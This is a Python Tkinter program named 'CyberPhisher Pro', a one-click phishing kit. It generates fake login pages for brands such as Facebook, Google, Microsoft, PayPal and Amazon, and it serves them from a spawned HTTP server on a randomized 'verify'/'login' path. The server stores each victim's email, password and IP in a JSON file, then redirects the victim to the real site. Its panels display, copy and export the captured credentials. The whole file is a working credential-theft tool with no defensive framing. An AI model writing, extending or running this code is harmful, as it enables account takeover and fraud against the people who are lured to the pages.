import tkinter as tk
from tkinter import messagebox
import threading, os, random, json, socket, subprocess, sys, string
from datetime import datetime

class CyberPhisher:
    def __init__(self, parent, db, logger):
        self.parent = parent; self.db = db; self.logger = logger
        self.frame = tk.Frame(parent, bg='#1a1a2e')
        self.server_process = None
        self.current_page = None
        self.current_port = 8080

    def build(self):
        self.frame.pack(fill='both', expand=True)
        header = tk.Frame(self.frame, bg='#1a1a2e'); header.pack(fill='x', padx=10, pady=5)
        tk.Label(header, text="CyberPhisher Pro", font=('Courier',16,'bold'), fg='#ff0000', bg='#1a1a2e').pack(side='left')
        self.live_dot = tk.Label(header, text="● OFFLINE", font=('Courier',9,'bold'), fg='#666', bg='#1a1a2e')
        self.live_dot.pack(side='right', padx=5)
        tk.Label(header, text="One-Click Phishing Engine", font=('Courier',9,'bold'), fg='#00ff88', bg='#1a1a2e').pack(side='right', padx=5)

        canvas = tk.Canvas(self.frame, bg='#1a1a2e', highlightthickness=0)
        vs = tk.Scrollbar(self.frame, orient='vertical', command=canvas.yview)
        hs = tk.Scrollbar(self.frame, orient='horizontal', command=canvas.xview)
        inner = tk.Frame(canvas, bg='#1a1a2e')
        inner.bind('<Configure>', lambda e: canvas.configure(scrollregion=canvas.bbox('all')))
        canvas.create_window((0,0), window=inner, anchor='nw')
        canvas.configure(yscrollcommand=vs.set, xscrollcommand=hs.set)
        canvas.pack(side='left', fill='both', expand=True)
        vs.pack(side='right', fill='y'); hs.pack(side='bottom', fill='x')
        canvas.bind('<Configure>', lambda e: canvas.itemconfig(1, width=e.width))

        pages = [
            ("Facebook", "#1877f2", "facebook"), ("Instagram", "#e4405f", "instagram"),
            ("Google", "#4285f4", "google"), ("Microsoft", "#00a4ef", "microsoft"),
            ("Twitter", "#1da1f2", "twitter"), ("LinkedIn", "#0a66c2", "linkedin"),
            ("GitHub", "#333", "github"), ("Netflix", "#e50914", "netflix"),
            ("PayPal", "#003087", "paypal"), ("Amazon", "#ff9900", "amazon"),
            ("Dropbox", "#0061ff", "dropbox"), ("Snapchat", "#fffc00", "snapchat"),
            ("TikTok", "#000", "tiktok"), ("Spotify", "#1db954", "spotify"),
            ("Steam", "#00adee", "steam"), ("Custom", "#888", "custom"),
        ]
        
        pf = tk.LabelFrame(inner, text=" PHISHING PAGES ", font=('Courier',10,'bold'), fg='#ff0000', bg='#16213e', padx=8, pady=5)
        pf.pack(fill='x', padx=10, pady=3)
        for i in range(0, len(pages), 4):
            row = tk.Frame(pf, bg='#16213e'); row.pack(fill='x', pady=1)
            for name, color, slug in pages[i:i+4]:
                tk.Button(row, text=name, font=('Courier',9,'bold'), fg='#fff', bg=color, relief='raised', padx=8, pady=6,
                        command=lambda n=name,c=color,s=slug: self._launch(n,c,s)).pack(side='left', padx=2, expand=True, fill='x')

        sf = tk.LabelFrame(inner, text=" CONTROL PANEL ", font=('Courier',10,'bold'), fg='#00ff88', bg='#16213e', padx=8, pady=5)
        sf.pack(fill='x', padx=10, pady=3)
        srow = tk.Frame(sf, bg='#16213e'); srow.pack(fill='x')
        tk.Button(srow, text="STOP SERVER", font=('Courier',9,'bold'), fg='#fff', bg='#cc0000', relief='raised', padx=10, pady=5, command=self._stop_server).pack(side='left', padx=2)
        tk.Button(srow, text="View Captures", font=('Courier',9), fg='#fff', bg='#ff4444', relief='flat', padx=10, pady=5, command=self._view_creds).pack(side='left', padx=2)
        tk.Button(srow, text="Export Data", font=('Courier',9), fg='#fff', bg='#ffaa00', relief='flat', padx=10, pady=5, command=self._export_creds).pack(side='left', padx=2)
        tk.Button(srow, text="Clear All", font=('Courier',9), fg='#fff', bg='#cc0000', relief='flat', padx=10, pady=5, command=self._clear_creds).pack(side='left', padx=2)

        self.url_frame = tk.LabelFrame(inner, text=" LIVE PHISHING URL ", font=('Courier',10,'bold'), fg='#3fb950', bg='#0a2a0a', padx=15, pady=10)
        self.url_frame.pack(fill='x', padx=10, pady=5)
        self.url_label = tk.Label(self.url_frame, text="Server Offline", font=('Courier',14,'bold'), fg='#666', bg='#0a2a0a')
        self.url_label.pack()
        self.url_detail = tk.Label(self.url_frame, text="Select a page above to generate phishing link", font=('Courier',9), fg='#555', bg='#0a2a0a')
        self.url_detail.pack(pady=3)
        self.copy_btn = tk.Button(self.url_frame, text="📋 Copy URL", font=('Courier',10,'bold'), fg='#000', bg='#00ff88',
                relief='raised', padx=15, pady=6, command=self._copy_url, state='disabled')
        self.copy_btn.pack(pady=5)

        self.output = tk.Text(inner, font=('Courier',9), bg='#0a0a0a', fg='#00ff88', relief='flat', height=6)
        self.output.pack(fill='both', expand=True, padx=10, pady=5)
        self.status = tk.Label(inner, text="Ready", font=('Courier',8), fg='#888', bg='#1a1a2e')
        self.status.pack(anchor='w', padx=10)

    def _random_path(self):
        words = ['verify','secure','login','auth','account','signin','access','portal','connect','update',
                 'recover','confirm','validate','session','token','oauth','sso','idp','gateway','saml']
        return '/' + random.choice(words) + '-' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

    def _get_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80)); ip = s.getsockname()[0]; s.close(); return ip
        except: return '127.0.0.1'

    def _launch(self, name, color, slug):
        self._stop_server()
        d = os.path.expanduser("~/phishing_pages"); os.makedirs(d, exist_ok=True)
        
        # Generate unique path for this session
        path = self._random_path()
        page_dir = os.path.join(d, path.strip('/'))
        os.makedirs(page_dir, exist_ok=True)
        
        # Professional phishing page with unique styling per brand
        styles = {
            "facebook": "font-family:'Helvetica Neue',Helvetica,Arial,sans-serif",
            "google": "font-family:'Google Sans',Roboto,Arial,sans-serif",
            "microsoft": "font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif",
            "apple": "font-family:-apple-system,BlinkMacSystemFont,sans-serif",
        }
        font = styles.get(slug, "font-family:Arial,Helvetica,sans-serif")
        
        # Randomly vary the page structure
        variants = [
            # Variant 1: Clean centered
            f'<div style="max-width:400px;margin:auto;padding:40px 20px"><h1 style="color:{color}">{name}</h1><p>Sign in to continue</p><form method="POST" action="/capture"><input name="email" placeholder="Email" required><input name="password" type="password" placeholder="Password" required><button style="background:{color}">Sign In</button></form></div>',
            # Variant 2: Card with logo
            f'<div style="max-width:400px;margin:auto;padding:30px;background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.15)"><div style="text-align:center;font-size:40px;color:{color};margin-bottom:20px">🔒</div><h2 style="color:{color};text-align:center">{name}</h2><p style="text-align:center;color:#666">Enter your credentials</p><form method="POST" action="/capture"><input name="email" placeholder="Email address" required><input name="password" type="password" placeholder="Password" required><button style="background:{color}">Log In</button></form></div>',
            # Variant 3: Split layout
            f'<div style="display:flex;max-width:800px;margin:auto"><div style="flex:1;background:{color};color:#fff;padding:60px 40px"><h1>{name}</h1><p>Welcome back</p></div><div style="flex:1;padding:60px 40px"><h2>Sign In</h2><form method="POST" action="/capture"><input name="email" placeholder="Email"><input name="password" type="password" placeholder="Password"><button style="background:{color}">Sign In</button></form></div></div>',
        ]
        
        html_body = random.choice(variants)
        html = f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>{name} - Sign In</title><style>*{{margin:0;padding:0;box-sizing:border-box}}body{{background:#f5f6fa;{font};display:flex;align-items:center;justify-content:center;min-height:100vh}}input{{width:100%;padding:14px;margin:10px 0;border:2px solid #e1e4e8;border-radius:8px;font-size:16px;transition:border .3s}}input:focus{{outline:none;border-color:{color}}}button{{width:100%;padding:14px;background:{color};color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:15px}}button:hover{{filter:brightness(1.1)}}.footer{{text-align:center;margin-top:20px;color:#999;font-size:12px}}</style></head><body>{html_body}<div class="footer">Secured connection • {name} Inc.</div></body></html>'''
        
        with open(os.path.join(page_dir, 'index.html'), 'w') as f: f.write(html)
        self.current_page = f"{name} ({slug})"
        
        # Server script
        port = random.randint(8000, 9000)
        self.current_port = port
        server_code = f'''import http.server, urllib.parse, os, json
from datetime import datetime
F=os.path.expanduser("~/phishing_pages/captured_creds.json")
class H(http.server.SimpleHTTPRequestHandler):
 def do_POST(s):
  b=s.rfile.read(int(s.headers.get("Content-Length",0))).decode()
  d=dict(urllib.parse.parse_qsl(b));d["time"]=str(datetime.now());d["ip"]=s.client_address[0];d["page"]="{name}"
  c=[]
  if os.path.exists(F):c=json.load(open(F))
  c.append(d);json.dump(c,open(F,"w"),indent=2)
  s.send_response(302);s.send_header("Location","https://www.{slug}.com");s.end_headers()
  print(f"Captured: {{d.get('email')}} from {{d['ip']}}")
os.chdir(os.path.dirname(os.path.abspath(__file__)))
print("Server on :{port}")
httpd=http.server.HTTPServer(("0.0.0.0",{port}),H)
httpd.serve_forever()'''
        
        with open(os.path.join(d, 'server.py'), 'w') as f: f.write(server_code)
        
        self.server_process = subprocess.Popen([sys.executable, os.path.join(d, 'server.py')],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        ip = self._get_ip()
        live_url = f"http://{ip}:{port}{path}"
        self.url_label.config(text=live_url, fg='#00ff88')
        self.url_detail.config(text=f"Page: {name} | Port: {port} | Path: {path} | Status: LIVE", fg='#3fb950')
        self.live_dot.config(text="● LIVE", fg='#00ff88')
        self.copy_btn.config(state='normal')
        
        self.output.insert('end', f"\n{'='*50}\n")
        self.output.insert('end', f"  PHISHING PAGE LIVE\n")
        self.output.insert('end', f"  Target: {name}\n")
        self.output.insert('end', f"  URL: {live_url}\n")
        self.output.insert('end', f"  Port: {port}\n")
        self.output.insert('end', f"  Path: {path}\n")
        self.output.insert('end', f"{'='*50}\n")
        self.output.see('end')
        self.status.config(text=f"LIVE: {name} | {live_url}")
        
        def monitor():
            try:
                for line in self.server_process.stdout:
                    self.output.insert('end', line); self.output.see('end')
                    if 'Captured:' in line:
                        self.status.config(text=f"CAPTURED! {line.strip()}")
            except: pass
        threading.Thread(target=monitor, daemon=True).start()

    def _copy_url(self):
        url = self.url_label.cget('text')
        self.frame.clipboard_clear(); self.frame.clipboard_append(url)
        messagebox.showinfo("Copied", f"URL copied:\n{url}")

    def _stop_server(self):
        if self.server_process:
            try: self.server_process.kill()
            except: pass; self.server_process = None
        os.system("pkill -f 'python3 server.py' 2>/dev/null")
        self.url_label.config(text="Server Offline", fg='#666')
        self.url_detail.config(text="Select a page above to generate phishing link", fg='#555')
        self.live_dot.config(text="● OFFLINE", fg='#666')
        self.copy_btn.config(state='disabled')
        self.status.config(text="Server stopped")

    def _view_creds(self):
        cf = os.path.expanduser("~/phishing_pages/captured_creds.json")
        if os.path.exists(cf):
            creds = json.load(open(cf))
            d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title("Captured Credentials"); d.geometry("600x450")
            tk.Label(d, text=f"Credentials Captured: {len(creds)}", font=('Courier',12,'bold'), fg='#ff0000', bg='#1a1a2e').pack(pady=10)
            t = tk.Text(d, font=('Courier',9), bg='#0a0a0a', fg='#00ff88', relief='flat')
            t.pack(fill='both', expand=True, padx=10, pady=5)
            for c in creds[-50:]:
                t.insert('end', f"Email: {c.get('email','?')}\nPass: {c.get('password','?')}\nIP: {c.get('ip','?')}\nTime: {c.get('time','?')[:19]}\nPage: {c.get('page','?')}\n{'─'*40}\n")
            t.config(state='disabled')
            bf = tk.Frame(d, bg='#1a1a2e'); bf.pack(pady=5)
            tk.Button(bf, text="Copy All", font=('Courier',10), fg='#000', bg='#00ccff', relief='flat', padx=15, pady=5,
                    command=lambda: [d.clipboard_clear(), d.clipboard_append(t.get('1.0','end-1c'))]).pack(side='left', padx=5)
            tk.Button(bf, text="Close", font=('Courier',10), fg='#fff', bg='#666', command=d.destroy).pack(side='right', padx=5)
        else:
            messagebox.showinfo("No Data", "No credentials captured yet")

    def _export_creds(self):
        cf = os.path.expanduser("~/phishing_pages/captured_creds.json")
        if os.path.exists(cf):
            import shutil
            p = os.path.expanduser(f"~/phishing_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
            shutil.copy(cf, p)
            messagebox.showinfo("Exported", f"Saved to:\n{p}")

    def _clear_creds(self):
        cf = os.path.expanduser("~/phishing_pages/captured_creds.json")
        if os.path.exists(cf) and messagebox.askyesno("Clear All", "Delete all captured credentials permanently?"):
            os.remove(cf)
            messagebox.showinfo("Cleared", "All credentials deleted")
